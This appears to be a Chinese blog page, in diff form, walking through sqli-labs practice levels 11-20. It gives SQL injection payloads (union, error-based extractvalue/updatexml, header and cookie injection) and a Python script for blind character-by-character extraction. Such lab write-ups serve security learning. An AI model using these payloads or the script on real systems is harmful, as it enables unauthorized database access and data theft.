@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guguguguji.github.io","root":"/","scheme":"Muse","version":"7.7.2","exturl":false,"sidebar":{"position":"left","width":300,"display":"post","padding":8,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="sqli-labs 通关(11-20)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs 通关(11-20)">
+<meta property="og:url" content="https://guguguguji.github.io/2020/03/30/sqli-labs%E9%80%9A%E5%85%B3(11-20)/index.html">
+<meta property="og:site_name" content="咕咕咕咕叽开始随地打滚儿">
+<meta property="og:description" content="sqli-labs 通关(11-20)">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-03-30T11:26:07.801Z">
+<meta property="article:modified_time" content="2020-03-30T11:26:07.797Z">
+<meta property="article:author" content="guguguguji">
+<meta property="article:tag" content="sqli-labs">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://guguguguji.github.io/2020/03/30/sqli-labs%E9%80%9A%E5%85%B3(11-20)/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>sqli-labs 通关(11-20) | 咕咕咕咕叽开始随地打滚儿</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">咕咕咕咕叽开始随地打滚儿</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags<span class="badge">6</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories<span class="badge">1</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives<span class="badge">4</span></a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-fw fa-calendar"></i>Schedule</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://guguguguji.github.io/2020/03/30/sqli-labs%E9%80%9A%E5%85%B3(11-20)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/nk100006_5.png">
+      <meta itemprop="name" content="guguguguji">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="咕咕咕咕叽开始随地打滚儿">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sqli-labs 通关(11-20)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-03-30 19:26:07" itemprop="dateCreated datePublished" datetime="2020-03-30T19:26:07+08:00">2020-03-30</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="sqli-labs-通关-11-20"><a href="#sqli-labs-通关-11-20" class="headerlink" title="sqli-labs 通关(11-20)"></a>sqli-labs 通关(11-20)</h1><a id="more"></a>
+<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>使用burpsuite抓包，重发，比较方便，post类型的注入</p>
+<p>单引号闭合,由order by 可知有两列</p>
+<p><code>payload:    1&#39; union select 1,database()#</code></p>
+<p>![Less-11](./sqli-labs 通关(11-20)/Less-11.png)</p>
+<h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>同less-11，单引号变双引号</p>
+<h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>![Less-13-1](./sqli-labs 通关(11-20)/Less-13-1.png)</p>
+<p>被单引号和圆括号包裹，并且发现成功登录后只有图片发生了改变并没有回显数据，还是个盲注</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    url = <span class="string">r'http://url/Less-13/'</span></span><br><span class="line">    print(url)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        sqli = <span class="string">'1\') or ascii(substr((select database()),%d,1))=%d#'</span> %(x,i)</span><br><span class="line">        data=&#123;<span class="string">"uname"</span>: sqli, <span class="string">"passwd"</span>: <span class="number">1</span>, <span class="string">"submit"</span>: <span class="string">"Submit"</span>&#125;</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"flag.jpg"</span> <span class="keyword">in</span> response.content.decode(<span class="string">'utf-8'</span>):</span><br><span class="line">            result +=chr(i)</span><br><span class="line">            print(<span class="string">'result'</span>,result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>同Less-13，单引号加圆括号变成双引号</p>
+<h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>同Less-13，单纯的单引号</p>
+<h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>同Less-13，单引号变双引号加圆括号</p>
+<h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>![Less-17-1](./sqli-labs 通关(11-20)/Less-17-1.png)</p>
+<p>看源码可知，username是有检查的，password并没有，注入点应该在password</p>
+<p>![](./sqli-labs 通关(11-20)/Less-17-3.png)</p>
+<p>既然这道题是修改密码，那么username一定要数据库中已存在的，并且这里明确有个username的查询，username的正确，我们只能靠猜了，一般什么admin，root，user什么的。。。</p>
+<p>这里username为admin</p>
+<p>这道题没有回显数据但是有报错，所以我们可以使用报错注入</p>
+<p><code>payload:    1&#39; and 1=extractvalue(1,concat(0x7e,database()))#</code></p>
+<p>![](./sqli-labs 通关(11-20)/Less-17-4.png)</p>
+<h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>![](./sqli-labs 通关(11-20)/Less-18-1.png)</p>
+<p>这里查询了ip，看来可以从ip这里入手，应该是有关请求头的注入，关于ip我们一般会想到xff(X-Forwarded-For)头,但是修改了xff头，ip显示并没有任何改变，没有头绪选择看源码</p>
+<p>![](./sqli-labs 通关(11-20)/Less-18-2.png)</p>
+<p>发现ip是直接从REMOTE_ADDR获得的，REMOTE_ADDR能直接获取TCP协议数据包的底层会话IP地址，它能被代理服务器或路由修改伪造，但非修改XFF头就可以更改的。 </p>
+<p>并且这里username和password都有检查，都检查了些啥，等会儿再论</p>
+<p>![](./sqli-labs 通关(11-20)/Less-18-4.png)</p>
+<p>发现对数据库的操作除了查询username和password，还有个insert操作，涉及到了User-Agent，ip，username</p>
+<p>![](./sqli-labs 通关(11-20)/Less-18-3.png)</p>
+<p>并且对User-Agent并没有任何检查</p>
+<p>![](./sqli-labs 通关(11-20)/Less-18-5.png)</p>
+<p>![](./sqli-labs 通关(11-20)/Less-18-6.png)</p>
+<p>我们也可以看到登录成功后，会回显User-Agent，现在难题就是登录进去了，由之前的题目可以查出username和password，甚至可以通过Less-17直接修改密码。</p>
+<p>现在开始处理User-Agent，判断一下insert的结构</p>
+<p>![](./sqli-labs 通关(11-20)/Less-18-7.png)</p>
+<p>发现User-Agent在ip和username的前面</p>
+<p>构造payload</p>
+<p><code>payload:    1&#39;or updatexml(1,concat(&#39;#&#39;,database()),0),&#39;&#39;,&#39;&#39;)#</code></p>
+<p>![](./sqli-labs 通关(11-20)/Less-18-8.png)</p>
+<h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>User-Agent变成Referer，插入只有两个数据不是三个数据</p>
+<h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>登录进去，发现会返回cookie，猜测cookie可能是注入点，并且会报错，仍然使用报错注入</p>
+<p><code>payload:     1&#39; and 1=extractvalue(1,concat(&#39;#&#39;,database())) #</code></p>
+<p>![](./sqli-labs 通关(11-20)/Less-20.png)</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/sqli-labs/" rel="tag"># sqli-labs</a>
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/30/sqli-labs%E9%80%9A%E5%85%B3(1-10)/" rel="prev" title="sqli-labs通关(1-10)">
+      <i class="fa fa-chevron-left"></i> sqli-labs通关(1-10)
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sqli-labs-通关-11-20"><span class="nav-number">1.</span> <span class="nav-text">sqli-labs 通关(11-20)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-11"><span class="nav-number">1.1.</span> <span class="nav-text">Less-11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-12"><span class="nav-number">1.2.</span> <span class="nav-text">Less-12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-13"><span class="nav-number">1.3.</span> <span class="nav-text">Less-13</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-14"><span class="nav-number">1.4.</span> <span class="nav-text">Less-14</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-15"><span class="nav-number">1.5.</span> <span class="nav-text">Less-15</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-16"><span class="nav-number">1.6.</span> <span class="nav-text">Less-16</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-17"><span class="nav-number">1.7.</span> <span class="nav-text">Less-17</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-18"><span class="nav-number">1.8.</span> <span class="nav-text">Less-18</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-19"><span class="nav-number">1.9.</span> <span class="nav-text">Less-19</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-20"><span class="nav-number">1.10.</span> <span class="nav-text">Less-20</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guguguguji"
+      src="/images/nk100006_5.png">
+  <p class="site-author-name" itemprop="name">guguguguji</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guguguguji" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guguguguji" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guguguguji</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.2
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":false},"log":false});</script></body>
+</html>
+
